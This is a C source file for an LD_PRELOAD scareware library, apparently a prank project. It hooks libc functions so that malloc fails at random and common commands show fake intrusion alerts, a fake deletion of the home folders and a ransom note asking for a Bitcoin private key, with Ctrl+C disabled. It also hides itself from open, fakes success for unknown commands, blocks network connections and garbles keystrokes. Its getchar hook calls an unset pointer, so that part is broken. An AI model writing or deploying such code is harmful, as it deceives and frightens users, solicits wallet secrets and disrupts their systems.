#define _GNU_SOURCE
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <stdarg.h>
#include <errno.h>
#include <libgen.h>
#include <limits.h>
#include <sys/types.h> // For PATH_MAX
#include <sys/socket.h> // for connect
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <math.h>
#include <ctype.h> // for getchar
#include <pwd.h>
#include <termios.h> //for exit cleanup
#include <unistd.h>


static void* (*original_malloc)(size_t)=NULL;
ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;
int (*original_open)(const char *pathname, int flags, ...) = NULL;
static int (*connect_connect)(int, const struct sockaddr *, socklen_t) = NULL;
int (*original_getchar)(void) =NULL;

static int block_count = 0; // Global counter for blocked connections



// ####### MALLOC Random #######
//
// Will randomly return Null 
//
//
// topLimit defines the limit on how big the random generated number can be which defines 
// the crash conditions  
//
//
long get_random_uint() {  // calculates random number
    long r;
    long fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        if (read(fd, &r, sizeof(r)) < 0) {
            r = 42; //fallback value
        }
        close(fd);
    } else {
        r = 42; // fallback value
    }

    if (r < 0) {
        r = r * (-1);
    }

    r = r/1000;
    return r;  // always >= 0
}

static void mtrace_init(void) {
    original_malloc = dlsym(RTLD_NEXT, "malloc"); //calls original malloc
    if (NULL == original_malloc) { //error if original malloc couldnt be called
    }
}

void *malloc(size_t size) {
    long random;
    long topLimit=60000000;

    if(original_malloc==NULL) { //if original malloc doesnt exist call it
        mtrace_init();
    }

    pid_t pid = getpid();
    char exe_path[512];
    snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
    char exe[512];
    ssize_t len = readlink(exe_path, exe, sizeof(exe) - 1);
    if (len != -1) {
        exe[len] = '\0';
        const char *base = strrchr(exe, '/');
    if (base) {
        base = base + 1;
    } else {
        base = exe;
    }
        if (strcmp(base, "bash") == 0 || strcmp(base, "less") == 0 || strcmp(base, "cat") == 0 || strcmp(base, "nano") == 0 || strcmp(base, "head") == 0 || strcmp(base, "man") == 0) {
            return original_malloc(size); // Avoid collision with read() 
        }
    }

    random = get_random_uint(); //generater random number
    random = random % topLimit; // top limit how big random can be, sweet spot for gnome-waether

    void *p = NULL;
    p = original_malloc(size); //find free space

    if (size > random ){
        return NULL; 
    }
    return p;
}


//####### READ #######
// Hijack of the read() function. Simulates deletion with cat, less, chown or chmod. Simulates remote access with install and apt-get.

void restore_terminal() { //function needed to stop freezing the terminal after the _exit(0) command
    struct termios term;
    int fd = fileno(stdin);
    if (tcgetattr(fd, &term) == 0) {
        term.c_lflag |= (ECHO | ICANON);
        tcsetattr(fd, TCSANOW, &term);
    }
}

void remote_access() {
    fprintf(stderr, "\033[?25l");  // Hide cursor to look more realistic 
    fprintf(stderr, "Remote access detected from IP 192.168.0.173\n");
    sleep(1);
    fprintf(stderr, "Downloading spy software\n");

    const int width = 30;
    for (int i = 0; i <= width; ++i) {
        fprintf(stderr, "\r\033[32m[");
        for (int j = 0; j < width; ++j) {
            if (j <= i)
                fprintf(stderr, "#"); // symbol for the progress bar
            else
                fprintf(stderr, " ");
        }
        fprintf(stderr, "]\033[0m %d%%", (i * 100) / width);
        fflush(stderr); //guarantee print before next operation
        usleep(150000); 
    }
    sleep(1);
    fprintf(stderr, "\nYour system is being observed. We want 1 Bitcoin to revert this.");
    sleep(1);
    fprintf(stderr, "\nEnter your wallet's private key here:\n");
    fprintf(stderr, "\033[?25h");  // Show cursor again
    char key[128]; // e.g E9873D79C6D87DC0FB6A5778633389F4453213303DA61F20BD67FC233DORIKTF 
    if (fgets(key, sizeof(key), stdin)) { // input gets taken
    // Remove newline if present
    size_t len = strlen(key);
    if (len > 0 && key[len - 1] == '\n') {
        key[len - 1] = '\0';
        len--;
    } 

    if (len == 64) { // because a bitcoin private key is a 64 char long string of letters and numbers
        fprintf(stderr, "\033[33mThank you. You will hear from us.\033[0m\n");
    } else {
        fprintf(stderr, "\033[31mAre you really trying to trick us? This is an invalid key. We will publish all your private information.\033[0m\n");
        sleep(2);
    }
   } 
}

void deletion_simulation(const char *home) {
    char *fake_files[] = {"/Documents", "/Desktop", "/Public", "/snap", "/Downloads", "/.ssh", "/.cache", "/.local", "/.thunderbird", "/Projects", "/Videos"}; // simulates the deletion of all personal files

    for (int i = 0; i < 11; ++i) {
        fprintf(stderr, "deleted %s%s\n", home, fake_files[i]);
        usleep(300000 + rand() % 200000); //random sleep time because different sizes lead to different delete times
    }
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!original_read) {
        original_read = dlsym(RTLD_NEXT, "read");
    }
    
    static int deletion_triggered = 0;
    static int done = 0;
    static int remote_triggered = 0;

    if (done) {
        return 0;  
    }

    if (!deletion_triggered) {
        deletion_triggered = 1;
        signal(SIGINT, SIG_IGN); // Ignore Ctrl+C

        char exe[512];
        ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
        if (len != -1 && len < sizeof(exe)) {
            exe[len] = '\0';
            char *name = basename(exe); // extract the used command
            char parent_exe[256];
            char linkpath[64];
            snprintf(linkpath, sizeof(linkpath), "/proc/%d/exe", getppid());
            ssize_t len = readlink(linkpath, parent_exe, sizeof(parent_exe) - 1);
            if (len != -1) {
            	parent_exe[len] = '\0';
            	if (strstr(name, "less") && strstr(parent_exe, "/man")) { // man calls then less: have to avoid this function here called when we want to call the write function
            		return original_read(fd, buf, count);
    		}
	}
		
	// The commands chmod and chown are chosen because they modify permissions /usership, therefore an access is fitting. Additionally the cat and less function because they are used more often.
            if ((strstr(name, "chmod") || strstr(name, "chown") || strstr(name, "cat") || strstr(name, "less")) && !strstr(name, "man")) {
                fprintf(stderr, "\033[?25l");  // Hide cursor to look more realistic 
                fprintf(stderr, "\033[31mALERT: Unauthorized access detected\n");
                sleep(2);
                const char *home = getenv("HOME"); //personalize to user
                if (!home) home = "/home/user"; // if no user is found
                deletion_simulation(home);
                fprintf(stderr, "IRREVERSIBLE DELETION COMPLETE\n");
                sleep(3);
                fprintf(stderr, "Enjoy the rest of your day :)");
                sleep(3);
                fprintf(stderr, "\n");
                signal(SIGINT, SIG_DFL); // Reset Ctrl+C
                fprintf(stderr, "\033[?25h");  // Show cursor again
                done = 1;
                restore_terminal();
                _exit(0); // to stop immediately w/o displaying additional things from the command
            } 
           
        }
    }
    
    if (!remote_triggered) {
    	remote_triggered = 1;
        char exe[512];
        ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
        if (len != -1 && len < sizeof(exe)) {
            exe[len] = '\0';
            char *name = basename(exe);

            // This hijack for the "install" and "get-apt" command. install and apt-get are used for downloading, so a fake download of spy software is fitting
            if (strstr(name, "install") || strstr(name, "get-apt")) {
                signal(SIGINT, SIG_IGN);  // disable Ctrl+C for effect
                remote_access();
                signal(SIGINT, SIG_DFL);
                restore_terminal();
                _exit(0); 
            }
        }
    }
    
    char exe[512];
    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (len != -1 && len < sizeof(exe)) {
    	exe[len] = '\0';
	char *name = basename(exe);
	if (strstr(name, "gedit")) {
		fprintf(stderr, "Execute this command using the bash command\n"); // otherwise the gedit hijack is not enabled 
	    	restore_terminal();
	    	_exit(0);
	    }
	   }

    return original_read(fd, buf, count);
}

// ####### OPEN #######
//recommended to use with the commands cp, head, nano, cat

int open(const char *pathname, int flags, ...) {
    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
        if (!original_open) {
            fprintf(stderr, "Error: unable to load original open function\n");
            return -1;
        }
    }

    if (strstr(pathname, "preloadLib")) { // no one allowed to change this library
        errno = EACCES; // Permission denied
        return -1;
    }

    if (strstr(pathname, "secrets.txt")) { // no one allowed to read our secrets
        char *path_copy = strdup(pathname);
        char *dir = dirname(path_copy);

        char fake_path[PATH_MAX];
        snprintf(fake_path, sizeof(fake_path), "%s/stillASecret.txt", dir); // redirect to a new file
        free(path_copy);

        FILE *fp = fopen(fake_path, "w");
        if (fp) {
            fprintf(fp, "you should not be so curious\n"); // write into newly created file
            fclose(fp);
        } else {
            fprintf(stderr, "Error: could not create %s\n", fake_path);
            return -1;
        }

        return original_open(fake_path, flags);
    }

    if (strstr(pathname, "openThis.txt")) { // a trap for users
        fprintf(stderr, "You have been hacked. Don't do everything you're told\n");
        restore_terminal();
        _exit(0);
    }

    va_list args;
    va_start(args, flags);
    int result;
    if (flags & O_CREAT) {
        int mode = va_arg(args, int);
        result = original_open(pathname, flags, mode);
    } else {
        result = original_open(pathname, flags);
    }
    va_end(args);
    return result;
}


// ####### WRITE #######
//hijacks the output of invalid commands and the reverts the output of "whoami"

const char* get_real_username() { //helper function for "whoami"
    static char username[256] = {0};
    if (username[0] == '\0') {
        struct passwd *pw = getpwuid(geteuid());
        if (pw) {
            strncpy(username, pw->pw_name, sizeof(username) - 1);
        }
    }
    return username;
}

// Helper to reverse a string for "whoami"
void reverse_string(const char* in, char* out, size_t maxlen) {
    size_t len = strnlen(in, maxlen - 1);
    for (size_t i = 0; i < len; ++i) {
        out[i] = in[len - i - 1];
    }
    out[len] = '\0';
}

// write: in case of command not found print successful
typedef ssize_t (*orig_write_f_type)(int fd, const void *buf, size_t count);

ssize_t write(int fd, const void *buf, size_t count) {

    if (!original_write){
        original_write = dlsym(RTLD_NEXT, "write");
}

    if (getenv("DISABLE_WRITE_PRANK")) { // needed for connect function
        return original_write(fd, buf, count);
    }
    
    char *msg = strndup(buf, count);
    if (!msg) return original_write(fd, buf, count);

    // replace ""Command not found" warning
    if ((strstr(msg, "Command") && strstr(msg, "not found")) || strstr(msg, "Could not find command-not-found")) {
        const char *success_msg = "Finished execution: no errors\n";
        original_write(fd, success_msg, strlen(success_msg));
        free(msg);
        exit(0);
    }

    ssize_t result = original_write(fd, msg, count);
    free(msg);
    return result;
}


int puts(const char *s) { //because "whoami" doesn't call write directly
    static int (*real_puts)(const char *) = NULL;
    if (!real_puts) {
        real_puts = dlsym(RTLD_NEXT, "puts");
    }

    const char *username = get_real_username();
    if (username && strstr(s, username)) {
        char reversed[256];
        reverse_string(username, reversed, sizeof(reversed));
        return real_puts(reversed);
    }

    return real_puts(s);
}


int access(const char *pathname, int mode) { //pretending command-not-found doesn't exist
    static int (*orig_access)(const char *, int) = NULL;
    if (!orig_access) {
        orig_access = dlsym(RTLD_NEXT, "access");
    }

    if (strstr(pathname, "command-not-found")) {
        errno = ENOENT; // "No such file or directory"
        return -1;
    }

    return orig_access(pathname, mode);
}


//####### CONNECT #######
// Override connect() to selectively block certain ports
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    static int (*original_connect)(int, const struct sockaddr *, socklen_t) = NULL;
    if (!original_connect) {
        original_connect = dlsym(RTLD_NEXT, "connect");
    }

    int port = -1;
    char ip[INET6_ADDRSTRLEN] = "unknown";

    if (addr->sa_family == AF_INET) {
        struct sockaddr_in *addr_in = (struct sockaddr_in *)addr;
        port = ntohs(addr_in->sin_port);
        inet_ntop(AF_INET, &addr_in->sin_addr, ip, sizeof(ip));
    } else if (addr->sa_family == AF_INET6) {
        struct sockaddr_in6 *addr_in6 = (struct sockaddr_in6 *)addr;
        port = ntohs(addr_in6->sin6_port);
        inet_ntop(AF_INET6, &addr_in6->sin6_addr, ip, sizeof(ip));
    } else {
        printf("[INTERNET_ACCESS_BLOCKED] Unknown address family (%d)\n", addr->sa_family);
        return original_connect(sockfd, addr, addrlen);
    }

    int blocked_ports[] = {6667, 6697, 993};
    int should_block = 0;

    for (int i = 0; i < sizeof(blocked_ports) / sizeof(blocked_ports[0]); i++) {
        if (port == blocked_ports[i]) {
            should_block = 1;
            break;
        }
    }

    if (should_block) {
        block_count++;
        printf("[INTERNET_ACCESS_BLOCKED] Blocking connection to %s:%d\n", ip, port);
        printf("[INTERNET_ACCESS_BLOCKED] Total blocked: %d\n", block_count);

        FILE *logfile2 = fopen("/tmp/blocked2.log", "a");
        if (logfile2) {
            fprintf(logfile2, "Blocked connection to %s:%d (family %d)\n", ip, port, addr->sa_family);
            fclose(logfile2);
        }

        errno = ECONNREFUSED;
        return -1;
    } else {
        block_count++;
        printf("[INTERNET_ACCESS_BLOCKED] Blocking connection to %s:%d (other connection)\n", ip, port);
        printf("[INTERNET_ACCESS_BLOCKED] Total blocked: %d\n", block_count);

        FILE *logfile = fopen("/tmp/blocked.log", "a");
        if (logfile) {
            if (addr->sa_family == AF_INET) {
                fprintf(logfile, "Blocked IPv4 connection to %s:%d\n", ip, port);
            } else if (addr->sa_family == AF_INET6) {
                fprintf(logfile, "Blocked IPv6 connection to [%s]:%d\n", ip, port);
            }
            fclose(logfile);
        }

        errno = ECONNREFUSED;
        return -1;
    }
}


// ##### GETCHAR #####
// Supported keyboard layouts (lowercase only)
static const char* LAYOUTS[] = {
    "qwertyuiopasdfghjkl;'\\zxcvbnm,./",  // QWERTY 
    "qwertzuiopasdfghjklöäyxcvbnmü,.-",   // QWERTZ 
    "azertyuiopqsdfghjklmwxcvbn,;:!",      // AZERTY 
    "qwertzuiopasdfghjklöäyxcvbnmü,.-",    // CH DE 
    "qwertyuiopasdfghjkl;'\\zxcvbnm,./",   // CH FR
    NULL
};

// debugging checks
static const char* LAYOUT_NAMES[] = {
    "QWERTY (US)", "QWERTZ (German)", "AZERTY (French)",
    "Swiss-German", "Swiss-French", NULL
};

// what is the current layout
const char* detect_layout() {
    // In a real project, use: `setxkbmap -query` or `/etc/default/keyboard`
    // Here we default to QWERTY for demo purposes
    return LAYOUTS[0]; // Default to QWERTY
}

// Ignore keycap layout and convert to ABCDEFG / abcdefg
char to_alphabetical(char c) {
    const char* layout = detect_layout();
    if (!layout) return c;

    char lower_c = tolower(c);
    const char* pos = strchr(layout, lower_c);
    if (pos) {
        int index = pos - layout;
        return 'a' + index; // Map to abcde...
    }
    return c; // Not a letter, leave unchanged
}

// Hijacked getchar() with prank toggle
int getchar(void) {
    if (getenv("DISABLE_GETCHAR_PRANK")) {
        if (!original_getchar) {
            int (*original_getchar)(void) = dlsym(RTLD_NEXT, "getchar");
            return original_getchar();
        } 
    }

    int c = original_getchar();

    if (isalpha(c)) {
        char mapped = to_alphabetical(c);
        c = islower(c) ? mapped : toupper(mapped);
    }
    return c;
}
